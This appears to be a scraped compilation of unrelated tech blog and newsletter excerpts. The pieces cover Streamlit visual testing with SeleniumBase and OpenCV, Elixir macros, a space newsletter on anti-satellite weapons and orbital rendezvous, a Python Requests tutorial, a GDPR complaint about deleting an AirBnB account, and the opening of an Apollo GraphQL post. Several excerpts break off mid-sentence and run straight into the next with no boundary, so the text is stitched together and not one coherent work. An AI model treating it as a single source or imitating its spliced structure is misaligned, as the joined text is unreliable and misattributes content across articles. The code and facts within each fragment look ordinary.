href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/visual_baseline/test_package.test_basic/first_test/tags_level_2.txt">tags_level2.txt</a></li><li><strong>Level 3 (most strict)</strong>: HTML tags, attribute names and attribute values are compared to <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/visual_baseline/test_package.test_basic/first_test/tags_level_3.txt">tags_level3.txt</a> &nbsp; &nbsp; </li></ul><p>As mentioned in the “Defining Test Success” section, I run the <code>check_window</code> function at Level 2, because the Folium library adds an GUID-like id value to the attribute values in the HTML, so the tests will never pass at Level 3 because the attribute values are always different between runs.</p><p>For the second test principle (“check certain values are equal”), the <code>assert_text</code> method is very easy to run:</p><p><code>self.assert_text("streamlit-folium")</code></p><p>This function checks that the exact text “streamlit-folium” is present in the app, and the test passes because it’s the value of the H1 heading in this example.</p><h2 id="testing-using-opencv">Testing Using OpenCV</h2><p>While checking the DOM structure and presence of a piece of text provides some useful information, my true acceptance criterion is that the visual appearance of the app doesn’t change from the baseline. In order to test that the app is visually the same <em>down to the pixel</em>, we can use the <code>save_screenshot</code> method from SeleniumBase to capture the current visual state of the app and compare to the baseline using the OpenCV package:</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Using OpenCV, the first step is to read in the baseline image and the current snapshot, then compare that the size of the pictures are identical (the <code>shape</code> comparison checks that the NumPy ndarrays of pixels have the same dimensions). Assuming the pictures are both the same size, we can then use the <code>subtract</code> function from OpenCV to calculate the per-element difference between pixels by channel (blue, green and red). If all three channels have no differences, then we know that the visual representation of the Streamlit app is identical between runs.</p><h2 id="automating-tests-using-github-actions">Automating Tests Using GitHub Actions</h2><p>With our SeleniumBase and OpenCV code set up, we can now feel free to make changes to our Streamlit Component (or other Streamlit apps) and not worry about things breaking unintentionally. In my single-contributor project, it’s easy to enforce running the tests locally, but with tools such as <a href="https://github.blog/2019-08-08-github-actions-now-supports-ci-cd/">GitHub Actions available for free for open-source projects</a>, setting up a <a href="https://www.infoworld.com/article/3271126/what-is-cicd-continuous-integration-and-continuous-delivery-explained.html">Continuous Integration pipeline</a> guarantees the tests are run for each commit.</p><p>The streamlit-folium has a workflow <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml"><code>run_tests_each_PR.yml</code></a> defined that does the following:</p><ul><li>Sets up a <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L18">test matrix for Python 3.6, 3.7, 3.8</a></li><li>Installs the <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L30">package dependencies</a> and <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L31">test dependencies</a></li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L35-L37">Lints the code</a> with flake8</li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L40">Install Chrome with seleniumbase</a></li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L43">Run the Streamlit app</a> to test in the background</li><li>Run the <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L46">SeleniumBase and OpenCV tests in Python</a></li></ul><!--kg-card-begin: html--><!--kg-card-end: html--><p>By having this workflow defined in your repo, and <a href="https://docs.github.com/en/github/administering-a-repository/enabling-required-status-checks">required status checks enabled on GitHub</a>, every pull request will now have the following status check appended to the bottom, letting you know the status of your changes:</p><figure><img src="https://lh4.googleusercontent.com/JS0raqd2-aZ1J2AVCjl7kfQvNFpZkTK-rvcnnYvVBVY8yGV37OIRxrE6DPpQntQeU7ZilRI8Pvmjn4TP_PeXByZWEehHGHx5hPQaV4wuolCCNhondlxYHXm1f0a459trimHgPgjY" alt=""></figure><h2 id="writing-tests-saves-work-in-the-long-run">Writing Tests Saves Work In The Long Run</h2><p>Having tests in your codebase has numerous benefits. As explained above, automating visual regression tests allows you to maintain an app without having to have a human in the loop looking for changes. Writing tests is also a great signal to potential users that you care about stability and long-term maintainability of your projects. It’s not only easy to write tests for a Streamlit app and have them automatically run on each GitHub commit, but that the extra work of adding tests to your Streamlit project will save you time in the long run. &nbsp;</p><p><em>Have questions about this post or Streamlit in general?

    <div>
        <p><em>Metaprogramming</em> is a scary word: it sounds like voodoo for programmers, and in some manners it is. It is used by most popular Elixir libraries (Ecto, Phoenix and Elixir itself) and as I leveled up as an Elixir programmer, I needed to understand how it worked under the hood. </p><p>I personally felt intimidated by the topic, and I owned the <a href="https://pragprog.com/titles/cmelixir/metaprogramming-elixir/"><em>Metaprogramming Elixir</em> book</a> for more than a year before actually reading it 😱</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/elixir-books.jpg" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/elixir-books.jpg 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/elixir-books.jpg 1000w, https://www.christianblavier.com/content/images/2020/11/elixir-books.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>My Elixir personal library&nbsp;</figcaption></figure><p>But for any seasoned Elixir programmer, it is an excellent handbook and very pleasant to read. It is also pragmatic and I concur 100% with Chris McCord’s introductory advice:</p><blockquote>Rule 1 : Don't Write Macros - Chris McCord</blockquote><p>Be cautious with <em>metaprogramming</em> as it is hardly maintainable and a pain to debug; don't even think about writing your application core features with it. It is more relevant for technical libraries, custom DSL and any other specific subjects.</p><h2 id="it-s-a-kind-of-magic">It's a kind of magic</h2><p>As many of you, I came from a Ruby on Rails development background and I remember that while learning Rails, I was so impressed by the language expressivity and its magic features. Coming then from a Java background, it was a blessing to me!</p><figure><pre><code>irb&gt; 2.years.from_now + 5.days.from_now

Same logic also applies to Elixir <em>metaprogramming</em> (remember Chris McCord's motto? "<em>Don't Write Macros" </em>😅)</li><li>Ruby magic is <strong>dynamic</strong> by nature which means it is performed at runtime, at the expense of performance. Whereas <strong>Elixir macros are evaluated at compile time</strong> and inserted in your bytecode as if it were manually written code.</li></ul><p>Before going deeper in the subject, it’s worth reminding that <em>metaprogramming</em> is the art of writing code that will generate code. <em>Metaprogramming</em> features are first class members of the Elixir language which provides macro API to rapidly extend the core language.</p><p>Did you know that <em>if-then-else</em> or <em>unless</em> block syntax are written in Elixir through its macro mechanism? It provides syntaxic sugar over a binary case pattern matching structure.</p><figure><pre><code>defmacro macro_unless(clause, do: expression) do
  quote do
    if(!unquote(clause), do: unquote(expression))
  end
end</code></pre><figcaption>unless block written with an Elixir macro</figcaption></figure><p>You could also be using meta-programmed features everyday without knowing it:</p><ul><li><a href="https://github.com/elixir-lang/elixir/tree/master/lib/ex_unit">ExUnit</a> test definitions leverages on macros</li><li><a href="https://github.com/elixir-ecto/ecto/blob/master/lib/ecto/query.ex">Ecto querying DSL</a> can perfectly mimic SQL language thanks to <em>metaprogramming</em></li><li>Of course Chris McCord’s Phoenix framework uses macro a lot, like the <a href="https://hexdocs.pm/phoenix/routing.html">Routing DSL</a></li></ul><p><strong>By the way, did you know that more than 90% of the Elixir sourcecode is written in Elixir? Meta enough for you? 🤯</strong></p><h2 id="elixir-macros-101">Elixir Macros 101</h2><p>Your first Elixir macros will be a bit tedious to write. I won’t give a full course about Elixir <em>metaprogramming</em> (buy <a href="https://pragprog.com/titles/cmelixir/metaprogramming-elixir/">Chris McCord’s book</a>!) but I will instead give you a few keys to understand it.</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/CleanShot-2020-11-21-at-08.29.12@2x.png" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/CleanShot-2020-11-21-at-08.29.12@2x.png 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/CleanShot-2020-11-21-at-08.29.12@2x.png 1000w, https://www.christianblavier.com/content/images/2020/11/CleanShot-2020-11-21-at-08.29.12@2x.png 1182w" sizes="(min-width: 720px) 720px"><figcaption>Can't blame <a href="https://twitter.com/matt_chabert">Matthieu</a>, happened to me as well!</figcaption></figure><p>The main thing you need to understand is that all code you write in Elixir is represented in memory as an <em>Abstract Syntax Tree</em> (AST). The compiler will parse your code and turn it into an AST, then the BEAM will evaluate the AST in order to run it.</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/Untitled-2020-11-20-0920.png" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/Untitled-2020-11-20-0920.png 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/Untitled-2020-11-20-0920.png 1000w, https://www.christianblavier.com/content/images/size/w1600/2020/11/Untitled-2020-11-20-0920.png 1600w, https://www.christianblavier.com/content/images/2020/11/Untitled-2020-11-20-0920.png 1938w" sizes="(min-width: 720px) 720px"><figcaption>Abstract Syntax Tree (AST)</figcaption></figure><p><em>Metaprogramming</em>, which we previously defined as « code to generate code » could be achieved by generating raw Elixir code (as strings) but it would be unefficient and hardly maintainable. </p><p>That’s why Elixir provides API’s to generate and evaluate AST. Here comes <code>quote</code>: an Elixir primitive which can convert any Elixir code into its AST.</p><pre><code>iex(1)&gt; quote do 5 + 8 * 3 end
#=&gt; {:+, [context: Elixir, import: Kernel],
#=&gt;   [5, {:*, 
#=&gt;     [context: Elixir, import: Kernel], 
#=&gt;     [8, 3]
#=&gt;   ]}]
#=&gt; }</code></pre><p>This code can be evaluated the same way you would have evaluated code in a string (think <code>eval</code> in <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">Javascript</a>)</p><pre><code>iex(1)&gt; Code.eval_string("5 + 8 * 3")
#=&gt; {29, []}
iex(2)&gt; Code.eval_quoted(quote do 5 + 8 * 3 end)
#=&gt; {29, []}</code></pre><p>Now what happens if you try to evaluate code with dynamic parts? </p><pre><code>iex(1)&gt; a = 5
iex(2)&gt; Code.eval_string("3 * a")
#=&gt; ** (CompileError) nofile:1: undefined function a/0</code></pre><p>Of course <code>a</code> is unknown to your evaluated code and a simple way to fix this would be to use text interpolation.</p><pre><code>iex(1)&gt; a = 5
iex(2)&gt; Code.eval_string("3 * #{a}")
#=&gt; {15, []}</code></pre><p>Well the good news is you can interpolate within your quoted code as well: use the <code>unquote</code> primitive.</p><pre><code>iex(1)&gt; a = 5
iex(2)&gt; Code.eval_quoted(quote do 3 * unquote(a) end)
#=&gt; {15, []}</code></pre><p>Simple as that! So whenever you think you are lost between your <code>quote</code> / <code>unquote</code> blocks, just look at it as if it were text interpolation. </p><p>Then you need to know about <code>defmacro</code> which you probably already encountered in your Phoenix project. It's a special construct able to produce code, from quoted expressions and parameters.</p><p>Here is an example that generates a few functions :</p><pre><code>defmodule MyMacro do
  defmacro generate_functions(name_and_values) do
    for {name, value} &lt;- name_and_values do
      quote do
        def unquote(name)(), do: unquote(value)
      end
    end
  end
end

defmodule MyModule do
  require MyMacro
  
  MyMacro.generate_functions([{:one, 1}, {:two, 2}, {:three, 3}])
end

iex(1)&gt; MyModule.two + MyModule.three 
#=&gt; 5</code></pre><p>There are quite a few other things to know when it comes to Elixir <em>metaprogramming</em>, but <code>quote</code>, <code>unquote</code> and <code>defmacro</code> are the basics and can already help you to build powerful stuff.</p><h2 id="ok-but-what-for">Ok, but what for?</h2><p>I will end this post with some examples of the way we use <em>metaprogramming</em> in our Elixir projects.</p><h3 id="extends-ecto-query-api">Extends Ecto query API</h3><p>Ecto provides a fully featured querying API that mimics SQL. It relies on Elixir Macros and will be able to trigger compilation errors whenever your query is malformed.</p><figure><pre><code>iex(1)&gt; query = from u in User, where: u.age &gt; 0, select: u.name
iex(2)&gt; Repo.all(query)</code></pre><figcaption>Typical Ecto query</figcaption></figure><p>But every now and then you'll want to use some specific database functions not available in Ecto API. You can then use <code>fragment</code> Ecto function which let you insert raw SQL in your Ecto Query:</p><figure><pre><code>query = 
  from u in User,
  where: is_nil(fragment("?-&gt;&gt;?", u.metadata, "phone"))</code></pre><figcaption>Using fragment to access a field within a Postgres JSONB column</figcaption></figure><p>But the proper way is to leverage on macros to extend the Ecto query API:</p><figure><pre><code>defmodule MyQueryMacros do
  defmacro jsonb_get(column, key) do
    quote do
      fragment("?-&gt;&gt;?", unquote(column), unquote(key))
    end
  end
 end
 
 query = 
   from u in User,
   where: is_nil(jsonb_get(u.metadata, "phone"))</code></pre><figcaption>Same Ecto query using our homemade jsonb_get macro</figcaption></figure><h3 id="aliases-imports">Aliases &amp; Imports</h3><p>As your Elixir codebase grows, you can see that you repeat over and over the same <code>alias</code> and <code>import</code> blocks at the head of your files. Not really <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself">DRY</a>...</p><p>Phoenix already offers a solution you can use through the <code>use</code> / <code>__using__</code> macro. To declare a <em>controller</em> or a <em>view, </em>phoenix suggests a bunch of default aliases and imports declared in <code>my_app_web.ex</code> file. Here is an example of <a href="https://changelog.com/">changelog.com</a> <code>*_web.ex</code> file :</p><figure><a href="https://github.com/thechangelog/changelog.com/blob/master/lib/changelog_web.ex"><div><p>thechangelog/changelog.com</p><p>Hacker to the 💚.

However, that war will (hopefully!) be slow and boring, with countries prioritizing directed energy and electronic attacks on satellites over kinetic ones so as to avoid creating debris that would deny space access as much to themselves as others. <a href="https://spaceflightnow.com/2020/07/23/u-s-officials-say-russia-tested-a-new-anti-satellite-weapon/" target="_blank">Russia</a>, the <a href="https://en.wikipedia.org/wiki/Anti-satellite_weapon#United_States_ASATs" target="_blank">US</a>, <a href="https://en.wikipedia.org/wiki/2007_Chinese_anti-satellite_missile_test" target="_blank">China</a>, &amp; <a href="https://carnegieendowment.org/2019/04/15/india-s-asat-test-incomplete-success-pub-78884" target="_blank">India</a> all have direct ascent anti-satellite weapons (with the latter three countries having spread space debris during ill-conceived weapons tests), and <a href="https://en.wikipedia.org/wiki/Arrow_3#:~:text=Arrow%203%20may%20serve%20as%20an%20anti-satellite%20weapon" target="_blank">Israel may as well</a>. At least the US and Russia also have <a href="https://www.theverge.com/2020/7/23/21335506/russia-anti-satellite-weapon-test-kosmos-2543" target="_blank">anti-satellite satellites</a> that <a href="https://www.theverge.com/2020/1/31/21117224/russian-satellite-us-spy-kosmos-2542-45-inspection-orbit-tracking" target="_blank">maneuver around</a> and muck with other satellites in undefined ways. These countries also likely have ground and satellite-based jammers and lasers (both dazzling and destructive). Satellites are very hard to defend because they have predictable orbits and very limited maneuvering budgets, so instead of having a few <a href="https://spacenews.com/the-end-of-sbirs-air-force-says-its-time-to-move-on/" target="_blank">exquisite satellites as the US military does now</a>, the US DOD is following (and <a href="https://www.theverge.com/2020/10/6/21503165/spacex-space-development-agency-contract-missile-warning-satellites-starlink" target="_blank">employing</a>) the NewSpace industry toward a proliferation of small, disposable satellites. Related: A <a href="https://aerospace.org/sites/default/files/2020-10/Reesman_PhysicsWarSpace_20201001.pdf" target="_blank">PDF entitled “The physics of space war: how orbital dynamics constrain space-to-space engagements”</a> from Aerospace Corp. talks about how the limited ∆v budgets of space vehicles limits warfare and makes planning and timing essential to an attack. (The PDF, oddly, has the following invisible text on the first page: “<em><span>THIS MATERIAL IS BEING PROVIDED PRE-RELEASE SOLELY FOR THE USE OF GEN. JAMES DICKINSON, AND IS NOT APPROVED FOR RELEASE</span>.</em>”)</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#catching-the-iss-and-other-orbital-maneuvers">¶</a><strong id="catching-the-iss-and-other-orbital-maneuvers">Catching the ISS and other orbital maneuvers.</strong> When covering space missions, we often talk about ∆v (like how <a href="http://orbitalindex.com/archive/2019-03-05-archive-Issue-2/#the-beresheet-lunar-lander-performed-its-first-orbit-raising-burn" target="_blank">Beresheet's ∆v budget was minuscule</a> for a lunar mission), orbital inclinations (Starlink’s <a href="https://directory.eoportal.org/web/eoportal/satellite-missions/s/starlink" target="_blank">53° inclination</a> leads to its service coverage stopping around latitudes of 53°), and in-space rendezvous (ex. <a href="https://en.wikipedia.org/wiki/Mission_Extension_Vehicle" target="_blank">MEV-1</a>, Crew Dragon's <a href="https://youtu.be/3hK540tMmvw" target="_blank">approach to the ISS</a>, and the <a href="https://www.esa.int/ESA_Multimedia/Images/2020/11/ESA_tracks_Chang_e-5_Moon_mission" target="_blank">Chang'e 5 ascent vehicle’s upcoming lunar orbit rendezvous with its return vehicle</a>), but we rarely cover the concepts themselves, so here’s an exceptionally brief attempt. Orbital Mechanics has been around since well before artificial satellites were even remotely possible—for example, Walter Hohmann discovered his eponymous <a href="https://en.wikipedia.org/wiki/Hohmann_transfer_orbit" target="_blank">transfer orbit</a> in 1929. This simple transfer maneuver consists of two velocity changes, the first to elongate an orbital ellipse so that it intersects a target apogee and a second to circularize the ellipse (<a href="https://youtu.be/aKXNbf6NCKU" target="_blank">video explainer</a> 📺). Orbital plane changes, avoided whenever possible due to high energy cost, are completed by normal acceleration at the point around which the orbital plane should pivot. Meanwhile, rendezvous between two craft in different orbits often requires the application of multiple maneuvers (see <a href="https://www.spaceflightinsider.com/missions/human-spaceflight/breakdown-of-crew-1-flight-plan-an-inside-look/" target="_blank">Crew-1's flight plan</a>). Timing an orbital transfer is key, as the maneuvering spacecraft must give the target the correct lead time or it will end up&nbsp;in front or behind. Rendezvousing with another object in the same orbit is perhaps the most counterintuitive, as you must adjust your orbital period by leaving the shared orbit and later re-entering it. To "slow down" you accelerate to increase the height of your orbit, lengthening your orbital period relative to the other craft, let time pass, and then re-enter the original orbit once they've caught up. Conversely, to catch up, you decrease velocity to achieve a smaller, more eccentric orbit, which has a shorter orbital period. There are tons of resources out there for diving into the math of orbital mechanics (and related concepts like the <a href="https://en.wikipedia.org/wiki/Oberth_effect" target="_blank">Oberth effect</a> and Sun-synchronous orbits that are only possible because of torque from the <a href="https://en.wikipedia.org/wiki/Equatorial_bulge" target="_blank">Earth’s equatorial bulge</a>). Surprisingly, an easy read comes from the FAA's Office of Aerospace Medicine <a href="https://www.faa.gov/about/office_org/headquarters_offices/avs/offices/aam/cami/library/online_libraries/aerospace_medicine/tutorial/section3/spacecraft_design/" target="_blank">as part of their "Advanced Aerospace Medicine On-line" course</a> (we're not sure how Hohmann transfers relate to patching up wounded astronauts). You can also <a href="https://orbitalmechanics.info/" target="_blank">play with orbits in a simulator</a>, but we generally recommend <a href="https://www.kerbalspaceprogram.com/" target="_blank">Kerbal Space Program</a> if you really want to develop a more intuitive sense of two-body orbital mechanics while having a blast (pun very much intended). Sadly, KSP 2, the much-anticipated sequel with multiplayer support, <a href="https://www.polygon.com/2020/11/5/21551754/kerbal-space-program-2-release-date-delayed-2022" target="_blank">has now slipped to a 2022 release</a>.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div> <strong>Papers</strong><ul><li> <a href="https://earthsky.org/space/is-it-true-that-jupiter-protects-earth" target="_blank">Jupiter may protect us from asteroids</a>, but it also likely prevented us from having siblings—had the solar system not had a gas giant, we might have up to 6 planets in our habitable zone (<a href="https://iopscience.iop.org/article/10.3847/1538-3881/ab9ffe" target="_blank">paper</a>).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>HTTP requests run the internet. These HTTP requests are made by devices or browsers(clients) when accessing a webpage.</p>

<p>In python, the Requests library allows us to make HTTP requests in our code and this is very key since many modern applications make use of data from third-party services by the use of APIs.</p>

<p>Python Requests is a great library. It allows you to make GET and POST requests with the options of passing URL parameters, adding headers, posting form data, and more.</p>

<p>With the library, you can make requests to almost every website/webpage, but its power lies in accessing APIs to retrieve data in the form of JSON which you can then work with within your code, applications, and scripts.</p>



<h2>Installing the Requests library</h2>

<p>To install the python Requests library, run the command:</p>

<pre><code>pip install requests</code></pre>

<p>This installs the Requests module and dependencies if any.</p>



<h2>Making a simple request with the Requests module</h2>

<p>Let's try to make a simple request to the python website, https://www.python.org ( you can use any website) :</p>

<pre><code>import requests

r = requests.get("https://www.python.org/")</code></pre>

<p>First, we begin by importing the Requests module. From the Requests module, we use a <code>get() </code>function with our website's URL passed in. With that line of code, a request is made to https://www.python.org and the<span> response is saved into the <code>r </code>variable</span>.</p>

<p>Making a request with the Requests module requires an internet connection.</p>

<p>Now we have a <span>Response object, r</span>. We can retrieve all the information we need from this object.</p>

<p>After a request is made, we get a response from the website's server and we can read the server's response code:</p>

<pre><code>r.status_code    # 200</code></pre>

<p>The status response code of 200 indicates a successful request. You can access the source code of the webpage by:</p>

<pre><code>print(r.text)        # prints webpage's source code</code></pre>

<p>The entire source code of the webpage will be printed in your console. This is useful when doing web scraping.</p>



<h2>Making requests to APIs</h2>

<p>By accessing APIs, we can tap into the full functionality of the Requests module. In this tutorial, we will use an API that returns some fake data from <a href="https://jsonplaceholder.typicode.com/">https://jsonplaceholder.typicode.com/posts</a>. The fake data that will be returned represents data of a blog; there are blog posts, users, and comments.</p>

<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts")

print(r.status_code)    # 200</code></pre>

<p>Now, we have a Response object, r. We can retrieve all the information we need from it.</p>

<h2>Response Content</h2>

<p>We can read the content in various ways by using the <span>attributes and functions provided by the Request module</span>.</p>

<pre><code>r.status_code    # 200

r.encoding       # utf-8

r.url            # https://jsonplaceholder.typicode.com/posts

r.json()           # returns the json data

r.text           # returns the sourcecode

r.content        # returns the reponse body as bytes</code></pre>

<p><code>r.status_code </code>returns a code indicating whether a request was successful or not. 200 means successful. Common status codes that you have probably seen are 200, 404, and 500. 404 means client error and 500 means there was a server error.</p>

<p><code>r.encoding</code> returns the encoding of the response based on the HTTP headers.</p>

<p><code>r.url</code> returns the requested URL.</p>

<p><code>r.json()</code> returns a parsed JSON data from the response.</p>

<p><code>r.text</code> returns response is text format</p>

<p><code>r.content</code> returns the response formated in bytes</p>



<h2>Working with JSON response data</h2>

<p>The JSON data returned from <span>https://jsonplaceholder.typicode.com/posts </span>contains a lot of post data, we are going to need only one post data, therefore we will use this URL <span>https://jsonplaceholder.typicode.com/posts/1 </span>which returns only one post.</p>

<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts/1")

print(r.json())</code></pre>

<p><strong>Output:</strong></p>

<pre><code>{'userId': 1, 'id': 1, 'title': 'sunt aut facere repellat provident occaecati excepturi optio
reprehenderit', 'body': 'quia et suscipit\nsuscipit recusandae consequuntur expedita 
etcum\nreprehenderit molestiae ut ut quas totam\nnostrum rerum est autem sunt rem eveniet architecto'}
</code></pre>

<p>Note that this is just some dummy data representing a post/article with a userId, Id, title, and body.</p>

<p><code>r.json()</code> parses the response into a Python-compatible data type i.e a dictionary or list.</p>



<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts/1")

data = r.json()                    # json response is stored in 'data'

post_num = data['id']
user = data['userId']
title = data['title']
body = data['body']

print(f"Post number: {post_num}")
print(f"Written by user: {user}")
print("Title: " + title)
print("---------- Body ----------")                             
print(body)</code></pre>

<p><strong>Output</strong></p>

<pre><code>Post number: 1
Written by user: 1
Title: sunt aut facere repellat provident occaecati excepturi optio reprehenderit
---------- Body ----------
quia et suscipit
suscipit recusandae consequuntur expedita et cum
reprehenderit molestiae ut ut quas totam
nostrum rerum est autem sunt rem eveniet architecto</code></pre>



<h2>Passing URL Parameters</h2>

<p>It is possible to pass parameters in the URL's query string when working with Requests. URL parameters are a common way of passing data, you often see them after the <code>?</code> in a URL. An example is <span>https://www.google.com/search?q=hello</span>&nbsp; this is the URL of google when you search for "hello", therefore the <code>q=hello</code> is the URL parameter.</p>

<p>To pass parameters to the URL, pass the parameters as a dictionary to the <code>params </code>keyword argument. For example; <span>?q=hello</span> will be <span>{'q':'hello'}.</span></p>

<pre><code>import requests

r = requests.get("https://jsonplaceholder.typicode.com/comments/", params={"postId":1})

print(r.url)           # https://jsonplaceholder.typicode.com/comments/?postId=1</code></pre>

<p>You will notice that <code>r.url</code> returns a URL that has automatically appended the parameter to it; <code>?postId=1</code>.</p>



<p><strong>Another Example:</strong></p>

<pre><code>import requests

my_parameters = {"postId":2, "userId":8}

r = requests.get("https://jsonplaceholder.typicode.com/comments/", params=my_parameters)

print(r.url)          # https://jsonplaceholder.typicode.com/comments/?postId=2&amp;userId=8</code></pre>

<p>The keys and values in the <code>my_parameters</code> dictionary,<code> {"postId":2, "userId":8}</code> is converted to <code>?postId=2&amp;userId=8</code> in the final URL.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  
  <p><span>02 Dec 2020</span></p><p>A couple of weeks ago, I decided to delete my AirBnB account. I had only used it two times in some years anyway and – while their platform is certainly comfortable to use – I prefer not to externalize my cost of traveling to those who need a place to live in, as I do in my own hometown. Turns out, deleting your account is easier said than done. While I was writing this article, I even found out that I had already tried to delete my account a year ago without success.</p>

<p>So what happened? The account deletion procedure is quite straightforward: You log into your account, after a while you find the form to delete it, verify yourself with a code sent to your phone, and that is it. Some dark patterns trying to make you “deactivate” your account, which pretty much doesn’t do anything at all, but we’re used to that, right?</p>

<p>Except, a while after I did this, I received an email:</p>

<blockquote>
  <p>We understand that you would like to exercise one of your data rights, namely the right of erasure. Airbnb is required to verify that the person making the request is the data subject entitled to the information being requested. […]</p>

  <p>We kindly ask you to send us both of the following:</p>

  <ul>
    <li>A re-statement of your request</li>
    <li>A photocopy of a valid official government ID such as your driver’s license or passport to validate your identity and to facilitate your request</li>
  </ul>
</blockquote>

<p>In other words: Thanks for your request. How about you ask us again? Further, your email, password, and the code sent to your phone certainly enable you to spend your money here, but our login system is not secure enough to authorize a deletion of your data.</p>

<p>Well, slightly annoyed, I repeated my request, mentioning that I verified three factors (Email+Password/Phone number/Ownership of email) to authorize my request now. The GDPR was on my side, since <a href="https://gdpr-info.eu/art-17-gdpr/">Art. 17</a> defines the right to erasure. While <a href="https://gdpr-info.eu/art-12-gdpr/">Art. 12(6)</a> reads “[…] where the controller has reasonable doubts concerning the identity of the natural person making the request referred to in Articles 15 to 21, the controller may request the provision of additional information necessary to confirm the identity of the data subject.”, I don’t see any way in which my identity could have been reasonably doubted at this point.</p>

<p>Long story short, what followed was 10 more emails full of customer service bullshit, a mail to the Irish Data Protection Commission (DPC), and finally, three weeks after my initial request – and without me uploading my passport:</p>

<blockquote>
  <p>We understand that you would like to delete all of your personal data. Please understand that this means that we will no longer be able to provide our services to you.</p>

  <p>As you have provided us with sufficient information to prove your identity, we’ve started to review your request.</p>
</blockquote>

<p>What a boring adventure! Well, aside from AirBnB not giving a damn about our funny European GDPR, I wondered the most about the DPC’s answer, that, while generally helpful, included the following paragraph:</p>

<blockquote>
  <p>Please also note that the Data Protection Commission (the “DPC”) acts as an
independent regulator, and is therefore not in a position to approve or
otherwise any specific data processing operations as this could prejudice
the investigation of any future complaints. We are an independent office
whose primary function is to give general guidance to members of the public
regarding data protection.</p>
</blockquote>

<p>To be clear: The responsible party for all AirBnB’s non-payment activity in Europe, where I live, is <em>Airbnb Ireland UC</em><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>,
which makes the <a href="https://www.dataprotection.ie/">Irish DPC</a> the responsible agency to send complaints to. This agency tells you that it won’t actually interfere with any data processing operations, since this might influence how future complaints are handled. That’s exactly what I thought was part of their job: Giving out fines to companies, thereby further clarifying the GDPR’s application. Or is the Irish DPC more of an outsourced call center for US companies to keep complaining customers busy? It’s not a secret you sometimes <a href="https://www.telegraph.co.uk/technology/2020/10/14/privacy-activist-max-schrems-sues-irish-data-watchdog-letting/">have to sue the DPC</a> to make them do their job. But such a clear confession that they don’t intend to enforce the only law they are supposed to deal with is bizarre.</p>

<p>In the European Union, we have a traditional race to the bottom, in which Luxembourg, failing to contribute economic value, makes its money by being an <a href="https://www.investopedia.com/ask/answers/100115/why-luxembourg-considered-tax-haven.asp">inner-European tax haven</a>. In the same way Luxembourg welcomes companies that don’t intend to pay taxes, Ireland openly advertises for companies who don’t want to be bothered by the GDPR. I told you that AirBnB is based in Ireland? Guess, where AirBnB based their <a href="https://blog.derhagen.eu/assets/airbnb_addresses.png">payment services in Europe</a><sup id="fnref:1:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

December 2, 2020 | https://www.wisdomgeek.com/development/web-development/graphql/creating-graphql-api-apollo-server/ | <a href="https://web.archive.org/web/*/https://www.wisdomgeek.com/development/web-development/graphql/creating-graphql-api-apollo-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_70_faf"><div><p>One of the many complaints about the GraphQL ecosystem is that there is a lot of indirection around what packages to use to create a GraphQL application. Even after selecting one, there is a lot of boilerplate code that one must create to make a GraphQL server work. While that is true, it does not have to be complicated. In this post, we will use Apollo Server to create the simplest possible GraphQL Server.</p><h2>Why Apollo Server?</h2><p>From all the available options for creating a GraphQL server using JavaScript (graphQL.js, Express GraphQL, GraphQL Yoga, Apollo Server, and GraphQL Helix), Apollo Server 2 is what we will be using in this post.</p><p><span>- Advertisement -</span> <ins data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-1198872678846288" data-ad-slot="2989761355"></ins> </p><p>GraphQL Yoga seems to not be maintained anymore, thus it was easy ruling it out.</p><p>GraphQL.js was a too low level of implementation to consider.</p><p>GraphQL Helix did not seem to have a lot of community support.</p><p>The only other alternative to Apollo Server was Express GraphQL, but Apollo Server has a lot of convenience features that I preferred over Express GraphQL. Apollo Server’s Readme had a comparison with express-graphql at some point, which can help understand the differences. You can find it <a aria-label="undefined (opens in a new 